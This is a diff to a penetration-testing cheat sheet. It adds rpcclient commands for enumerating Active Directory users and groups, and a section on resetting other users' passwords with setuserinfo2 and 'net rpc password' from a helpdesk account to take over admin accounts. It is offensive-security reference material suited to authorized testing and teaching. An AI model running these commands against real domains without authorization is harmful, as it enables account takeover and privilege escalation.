@@ -421,10 +421,54 @@ Once connected you could enter commands like
 ```
 srvinfo
 enumdomusers
+queryuser "userrid#"
+enumdomgroups
+querygroup "grouprid#"
+querygroupmem "grouprid#"
 getdompwinfo
 querydominfo
 netshareenum
 netshareenumall
+lsaenumsid    ---gathers local users
+```
+
+#### Reset AD user password
+
+As Mubix explained in [Reset AD User Password with Linux](https://room362.com/post/2017/reset-ad-user-password-with-linux/). Often we have the credentials of limited administrative accounts such as IT or helpdesk. Sometimes, These accounts have an ability reset the password. This can be achieved in by using rpcclient in linux box provided smbclient and pass-the-hash package should be installed.
+
+setuserinfo2 command can be used in order to change the password.
+
+```
+rpcclient $ > setuserinfo2
+Usage: setuserinfo2 username level password [password_expired]
+result was NT_STATUS_INVALID_PARAMETER
+```
+
+Note: we won’t be able to change the password of users with AdminCount = 1 \(Domain Admins and other higher privileged accounts\).
+
+```
+rpcclient $> setuserinfo2 ima-domainadmin 23 'ASDqwe123'
+result: NT_STATUS_ACCESS_DENIED
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $>
+```
+
+Users having alternate admin accounts can be easily targeted.
+
+```
+rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'
+rpcclient $>
+```
+
+Note: The number 23 came from [MSDN article USER\_INFORMATION\_CLASS](https://msdn.microsoft.com/en-us/library/cc245617.aspx). The SAMPR\_USER\_INTERNAL4\_INFORMATION structure holds all attributes of a user, along with an encrypted password.
+
+This can be done using the net command as well but we need to install the samba-common-bin in our machine.
+
+```
+root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
+Enter new password for adminuser:
+Enter helpdesk's password:
+root@kali:~#
 ```
 
 ## Port 143/993 - IMAP
@@ -820,7 +864,6 @@ PORT      STATE SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
-
 ```
 
 #### Mongodb-database
@@ -947,7 +990,6 @@ PORT      STATE SERVICE
 |   Product Code: 90
 |   Revision: 2.10
 |_  Device IP: 192.168.xx.xx
-
 ```
 
 Rockwell Automation has
@@ -1169,5 +1211,7 @@ Tomcat suffers from default passwords. There is even a module in metasploit that
 
 > Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools \(RSAT\).
 
+# References:
 
+[https://bitvijays.github.io/](https://bitvijays.github.io/)
 
